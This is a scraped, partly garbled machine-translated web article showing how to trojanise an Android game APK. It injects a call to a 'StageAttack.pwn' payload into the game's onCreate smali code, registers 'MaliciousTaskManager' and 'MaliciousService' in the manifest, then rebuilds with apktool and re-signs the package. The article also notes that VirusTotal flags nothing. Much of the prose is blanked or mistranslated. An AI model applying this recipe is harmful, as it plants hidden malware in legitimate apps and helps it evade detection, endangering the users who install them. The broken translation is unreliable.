<pre><code class="java hljs">.<span class="hljs-function">method <span class="hljs-keyword">protected</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Landroid/os/Bundle;)</span>V
    .locals 9

    :try_start_0
    <span class="hljs-keyword">const</span>-string v0, "android.os.AsyncTask"

    .line 465
    invoke-<span class="hljs-keyword">static</span> </span>{v0}, Ljava/lang/Class;-&gt;forName(Ljava/lang/String;)Ljava/lang/Class;<font></font>
    :try_end_0<font></font>
    .<span class="hljs-keyword">catch</span> Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0<font></font>
<font></font>
    .line <span class="hljs-number">471</span><font></font>
    :catch_0<font></font>
    invoke-<span class="hljs-keyword">super</span> {p0, p1}, Landroid/support/v4/app/FragmentActivity;-&gt;onCreate(Landroid/os/Bundle;)V<font></font>
<font></font>
      &lt;--------------------------- <span class="hljs-comment">//  ,   472</span><font></font>
<font></font>
    .line <span class="hljs-number">473</span>
    invoke-<span class="hljs-keyword">static</span> {}, Lcom/halfbrick/mortar/NativeGameLib;-&gt;TryLoadGameLibrary()Z<font></font>
<font></font>
    .line <span class="hljs-number">475</span><font></font>
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;-&gt;getIntent()Landroid/content/Intent;<font></font>
<font></font>
    ...</code></pre><br>
<p>   smali  payload'.   apk    .     ,     <em>smali\kz\c\signscan</em>,   <em>com/halfbrick/mortar</em>.  <em>package name</em>  ,  <em>kz.c.signscan</em>  <em>com.halfbrick.mortar</em>. </p><br>
<p>:</p><br>
<pre><code class="java hljs">.class <span class="hljs-keyword">public</span> Lkz/c/signscan/StageAttack;</code></pre><br>
<p>:</p><br>
<pre><code class="java hljs">.class <span class="hljs-keyword">public</span> Lcom/halfbrick/mortar/StageAttack;</code></pre><br>
<p> smali  <code>MainActivity</code>    payload':</p><br>
<pre><code class="java hljs">invoke-<span class="hljs-keyword">static</span> {p0}, Lcom/halfbrick/mortar/StageAttack;-&gt;pwn(Landroid/content/Context;)V</code></pre><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">そしてに挿入し</font></font><code>MortarGameActivity</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ます。</font><font style="vertical-align: inherit;">その結果、メソッド</font></font><code>onCreate()</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">は次のようになります。</font></font></p><br>
<pre><code class="java hljs">...<font></font>
.<span class="hljs-function">method <span class="hljs-keyword">protected</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Landroid/os/Bundle;)</span>V
    .locals 9

    :try_start_0
    <span class="hljs-keyword">const</span>-string v0, "android.os.AsyncTask"

    .line 465
    invoke-<span class="hljs-keyword">static</span> </span>{v0}, Ljava/lang/Class;-&gt;forName(Ljava/lang/String;)Ljava/lang/Class;<font></font>
    :try_end_0<font></font>
    .<span class="hljs-keyword">catch</span> Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0<font></font>
<font></font>
    .line <span class="hljs-number">471</span><font></font>
    :catch_0<font></font>
    invoke-<span class="hljs-keyword">super</span> {p0, p1}, Landroid/support/v4/app/FragmentActivity;-&gt;onCreate(Landroid/os/Bundle;)V<font></font>
<font></font>
    .line <span class="hljs-number">472</span>
    invoke-<span class="hljs-keyword">static</span> {p0}, Lcom/halfbrick/mortar/StageAttack;-&gt;pwn(Landroid/content/Context;)V<font></font>
<font></font>
    .line <span class="hljs-number">473</span>
    invoke-<span class="hljs-keyword">static</span> {}, Lcom/halfbrick/mortar/NativeGameLib;-&gt;TryLoadGameLibrary()Z<font></font>
<font></font>
    .line <span class="hljs-number">475</span><font></font>
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;-&gt;getIntent()Landroid/content/Intent;<font></font>
<font></font>
    ...</code></pre><br>
<p><font style="vertical-align: inherit;"></font><code>MaliciousTaskManager</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ペイロード</font><font style="vertical-align: inherit;">のクラス</font><font style="vertical-align: inherit;">はBroadcastReceiverで、</font></font><code>MaliciousService</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これはIntentServiceなので、マニフェストに登録する必要があります。</font></font></p><br>
<pre><code class="xml hljs">...
<span class="hljs-tag">&lt;<span class="hljs-name">receiver</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MaliciousTaskManager"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MaliciousService"</span>/&gt;</span>
...</code></pre><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">チームですべてを梱包します</font></font><code>apktool b myfolder</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">その結果、apkファイルを取得します。</font><font style="vertical-align: inherit;">次に、Androidがアプリケーションを受け入れるように署名する必要があります。</font><font style="vertical-align: inherit;">最初に、署名する鍵を生成します。</font></font></p><br>
<pre><code class="plaintext hljs">keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code></pre><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">私たちはapkに署名します：</font></font></p><br>
<pre><code class="plaintext hljs">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name</code></pre><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">私たちは「違法」なことをしていないので、Virustotalは何も表示しません。</font><font style="vertical-align: inherit;">アプリケーションで使用できる権限のみを使用します。</font></font></p><br>
<p><img src="https://habrastorage.org/webt/po/ht/iu/pohtiuf5xpkonifhpozoth_pgbu.png" alt="画像"></p><br>
<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最終作品を紹介するビデオ：</font></font></p><br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/e5w5taMY8MA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/iBCX_A5FBVU" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>
<p><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">電報チャンネル</font></font></a></p></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja460983/index.html">私は本物ではない</a></li>
<li><a href="../ja460985/index.html">2019年の14の最高のかんばんツール</a></li>
<li><a href="../ja460987/index.html">「インターネットの神モード」：拡張機能ChromeとFirefoxを介してユーザーを追跡する</a></li>
<li><a href="../ja460989/index.html">D、Go、Rustのどちらの言語がCに置き換わる可能性が高く、その理由は何ですか？</a></li>
<li><a href="../ja460991/index.html">Tic Tac Toe、パート5：C ++バックブーストのビーエンド、HTTP</a></li>
<li><a href="../ja460995/index.html">REST APIとしてFlaskを使用してMLプロジェクトをデプロイし、Flutterアプリケーションからアクセスできるようにします</a></li>
<li><a href="../ja460997/index.html">観光客は科学者が大きな捕食者の数を推定するのを助けます</a></li>
<li><a href="../ja460999/index.html">ラモダとちょっとゲームをしましょう</a></li>
<li><a href="../ja461003/index.html">分析：取引所の高頻度取引市場の仕組み</a></li>
<li><a href="../ja461005/index.html">会社のテスト：面接で適切な質問をする</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>